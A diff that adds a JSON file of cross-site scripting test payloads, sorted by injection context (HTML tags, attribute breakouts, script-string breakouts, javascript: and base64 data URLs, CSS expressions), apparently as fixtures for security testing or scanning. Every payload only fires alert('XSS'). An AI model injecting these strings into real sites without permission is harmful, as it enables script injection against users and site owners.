@@ -1,0 +1,23 @@
+{
+  "html": [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg onload=alert('XSS')>"
+  ],
+  "attribute": [
+    "\" onmouseover=\"alert('XSS')\"",
+    "' onclick='alert(\"XSS\")'"
+  ],
+  "javascript": [
+    "\";alert('XSS');//",
+    "'-alert('XSS')-'"
+  ],
+  "url": [
+    "javascript:alert('XSS')",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
+  ],
+  "style": [
+    "expression(alert('XSS'))",
+    "behavior: url(javascript:alert('XSS'))"
+  ]
+}
